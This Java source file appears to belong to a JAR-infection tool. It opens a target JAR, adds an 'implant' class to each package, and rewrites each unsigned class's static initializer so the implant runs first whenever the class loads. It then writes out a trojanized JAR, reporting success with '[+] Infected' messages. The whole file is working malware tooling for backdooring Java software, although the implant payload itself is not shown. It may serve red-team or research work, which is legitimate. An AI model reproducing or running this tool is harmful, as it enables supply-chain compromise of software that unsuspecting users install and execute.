package org.example.injector;

import javassist.CtClass;
import javassist.bytecode.*;
import org.example.implants.ClassImplant;

import java.io.DataInputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.jar.JarEntry;

import static org.example.injector.Helpers.setStaticFlagForMethod;

public class ClassInjector {
    private final Class<?> implantComponentClass;

    ClassInjector(Class<?> implantComponent) {
        this.implantComponentClass = implantComponent;
    }

    public static void main(String[] args) {
        if (args.length < 2) {
            System.exit(1);
        }

        ClassInjector injector = new ClassInjector(ClassImplant.class);
        try {
            Path targetPath = Path.of(args[0]);
            Path outputPath = Path.of(args[1]);
            System.out.println("[i] Target JAR: " + targetPath);
            System.out.println("[i] Output JAR: " + outputPath);
            if (!Files.exists(targetPath) && !Files.isRegularFile(targetPath)) {
                System.out.println("[!] Target JAR is not a regular existing file.");
                System.exit(1);
            }
            if (Files.exists(outputPath) && targetPath.toRealPath().equals(outputPath.toRealPath())) {
                System.out.println("[-] Target JAR and output JAR cannot be the same.");
                System.exit(1);
            }
            if (injector.infect(targetPath, outputPath)) {
                System.out.println("[+] Infected '" + targetPath + "'. Modified JAR available at: " + outputPath);
            } else {
                System.out.println("[-] Did not infect '" + targetPath + "'.");
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
        Map<String, ClassFile> infectedPackages = new HashMap<>();
        boolean foundSignedClasses = false;
        try (JarFileFiddler fiddler = JarFileFiddler.open(targetJarFilePath, outputJar)) {
            for (JarFileFiddler.WrappedJarEntry entry : fiddler) {
                if (!entry.getName().endsWith(".class")) {
                    entry.passOn();
                    continue;
                }
                if (entry.getEntry().getCodeSigners() != null) {
                    foundSignedClasses = true;
                    entry.passOn();
                    continue;
                }

                ClassFile currentlyProcessing;
                try (DataInputStream in = new DataInputStream(entry.getContent())) {
                    currentlyProcessing = new ClassFile(in);

                    String targetPackageName = parsePackageNameFromFqcn(currentlyProcessing.getName());
                    if (!infectedPackages.containsKey(targetPackageName)) {
                        ClassFile implantComponent = ImplantReader.findAndReadClassFile(implantComponentClass); // TODO Optimize this
                        String implantComponentClassName = parseClassNameFromFqcn(implantComponent.getName());
                        implantComponent.setName(targetPackageName + "." + implantComponentClassName);
                        JarEntry newJarEntry = convertToJarEntry(implantComponent);
                        implantComponent.write(fiddler.addNewEntry(newJarEntry));
                        infectedPackages.put(targetPackageName, implantComponent);
                        System.out.println("[+] Wrote implant class '" + newJarEntry.getName() + "' to JAR file.");
                    }

                    ClassFile implantedClass = infectedPackages.get(targetPackageName);
                    modifyClinit(entry, currentlyProcessing, implantedClass);
                    System.out.println("[+] Modified class initializer for '" + currentlyProcessing.getName() + "'.");
                } catch (ClassNotFoundException e) {
                    throw new RuntimeException(e);
                }
            }

            if (foundSignedClasses) {
                System.out.println("[-] Found signed classes. These were not considered for infection.");
            }

            System.out.println("[+] Infected " + infectedPackages.size() + " package paths in JAR file.");
            return !infectedPackages.isEmpty();
        }
    }


    private static void modifyClinit(JarFileFiddler.WrappedJarEntry jarEntry, ClassFile targetClass, ClassFile implantClass) throws IOException {
        MethodInfo implantInitMethod = implantClass.getMethod("implant");
        if (implantInitMethod == null) {
            throw new UnsupportedOperationException("Implant class does not have a 'public static implant()' function.");
        }

        MethodInfo currentClinit = targetClass.getMethod(MethodInfo.nameClinit);
        if (currentClinit == null) {
            // There are no static blocks in this class, create an empty one
            currentClinit = new MethodInfo(targetClass.getConstPool(), MethodInfo.nameClinit, "()V");
            setStaticFlagForMethod(currentClinit);
            Bytecode stubCode = new Bytecode(targetClass.getConstPool(), 0, 0);
            stubCode.addReturn(CtClass.voidType);
            currentClinit.setCodeAttribute(stubCode.toCodeAttribute());

            try {
                targetClass.addMethod(currentClinit);
            } catch (DuplicateMemberException e) {
                throw new RuntimeException("Internal error: clinit already exist despite not existing", e);
            }
        }

        // Modify the clinit method of the target class to run the implant method (before its own code)
        Bytecode additionalClinitCode = new Bytecode(targetClass.getConstPool());
        additionalClinitCode.addInvokestatic(implantClass.getName(), implantInitMethod.getName(), implantInitMethod.getDescriptor());
        CodeAttribute additionalClinitCodeAttr = additionalClinitCode.toCodeAttribute();
        CodeAttribute currentClinitCodeAttr = currentClinit.getCodeAttribute();
        ByteBuffer concatenatedCode = ByteBuffer.allocate(additionalClinitCodeAttr.getCodeLength() + currentClinit.getCodeAttribute().getCodeLength());
        concatenatedCode.put(additionalClinitCodeAttr.getCode());
        concatenatedCode.put(currentClinitCodeAttr.getCode());
        CodeAttribute newCodeAttribute = new CodeAttribute(targetClass.getConstPool(), currentClinitCodeAttr.getMaxStack(), currentClinitCodeAttr.getMaxLocals(), concatenatedCode.array(), currentClinitCodeAttr.getExceptionTable());
        currentClinit.setCodeAttribute(newCodeAttribute);

        // Modify the class file
        targetClass.write(jarEntry.addOnly());
    }


    private static String parsePackageNameFromFqcn(final String fqcn) {
        String[] parts = fqcn.split("\\.");
        if (parts.length < 2) {
            throw new RuntimeException("Not a fully qualified class name: " + fqcn);
        }
        String[] packageParts = Arrays.copyOfRange(parts, 0, parts.length - 1);
        return String.join(".", packageParts);
    }

    private static String parseClassNameFromFqcn(final String fqcn) {
        String[] parts = fqcn.split("\\.");
        if (parts.length < 2) {
            throw new RuntimeException("Not a fully qualified class name: " + fqcn);
        }
        return parts[parts.length - 1];
    }

    private static String convertToClassFormatFqcn(final String dotFormatClassName) {
        return dotFormatClassName.replace(".", "/");
    }

    private static JarEntry convertToJarEntry(final ClassFile classFile) {
        String fullPathInsideJar = classFile.getName().replace(".", "/") + ".class";
        return new JarEntry(fullPathInsideJar);
    }

}
